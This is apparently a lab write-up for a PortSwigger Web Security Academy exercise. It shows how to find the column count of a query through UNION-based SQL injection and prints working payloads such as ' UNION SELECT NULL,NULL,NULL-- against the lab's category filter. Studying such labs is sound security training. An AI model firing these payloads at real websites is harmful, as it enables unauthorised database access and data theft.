# PortSwigger — SQL Injection UNION Attack, Determining the Number of Columns Returned by the Query

`Web Security Academy` • `SQL Injection` • `Practitioner`

## TL;DR

A product category filter is vulnerable to UNION-based SQL injection. The number of columns returned by the query is unknown. By injecting `UNION SELECT NULL` payloads and incrementing the number of `NULL` values, the query succeeds when the count matches — revealing **3 columns**.

**Lab URL:** `https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns`

---

## Challenge Description

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>
> The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
>
> To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

**Context:**
- Difficulty: **Practitioner**
- Category: **SQL Injection — UNION Attacks**
- Goal: Determine the number of columns via a UNION-based NULL injection

---

## Recon

### Step 1 — Identify the injection point

The application exposes a `category` GET parameter:

```
https://<lab-id>.web-security-academy.net/filter?category=Gifts
```

Appending `'` triggers a **500 Internal Server Error** — the parameter is injectable.

---

## Exploitation

### Step 2 — Determine column count via NULL injection

The UNION technique requires the injected query to return the **exact same number of columns** as the original query. The safest approach is to use `NULL` values, which are compatible with any data type.

**Test with 1 column:**
```
/filter?category=Gifts' UNION SELECT NULL--
```
➡ **500 Internal Server Error** — not 1 column.

**Test with 2 columns:**
```
/filter?category=Gifts' UNION SELECT NULL,NULL--
```
➡ **500 Internal Server Error** — not 2 columns.

**Test with 3 columns:**
```
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
```
➡ **200 OK** — page loads normally with an extra empty row ✅

### Final Payload

```
/filter?category=Gifts' UNION SELECT NULL,NULL,NULL--
```

Full URL:

```
https://<lab-id>.web-security-academy.net/filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
```

```
✅ Congratulations, you solved the lab!
```

---

## Attack Chain Summary

```
/filter?category=Gifts' → 500 error → injection confirmed
        ↓
' UNION SELECT NULL--        → 500 error → not 1 column
        ↓
' UNION SELECT NULL,NULL--   → 500 error → not 2 columns
        ↓
' UNION SELECT NULL,NULL,NULL-- → 200 OK → 3 columns confirmed ✅
        ↓
LAB SOLVED ✅
```

---

## Why NULL?

`NULL` is compatible with **every data type** (integer, varchar, date, etc.). Using `NULL` avoids type mismatch errors that would occur if, for example, a string value was injected into an integer column. This makes it the most reliable method for column count enumeration.

## Why `--`?

`--` is the SQL line comment delimiter for most DBMS (PostgreSQL, MySQL, MSSQL). It neutralizes the rest of the original query — including any trailing conditions such as `AND released = 1` — preventing syntax errors.

---

## Key Takeaways

- The column count must **exactly match** between the original query and the injected UNION query
- `NULL` payloads are the most reliable for enumeration — they're type-agnostic
- This technique is the **mandatory first step** of any UNION-based SQL injection attack
- Once the column count is known, the next steps involve identifying string-compatible columns and extracting data

---

## References

- [PortSwigger — SQL Injection UNION Attacks](https://portswigger.net/web-security/sql-injection/union-attacks)
- [OWASP — SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

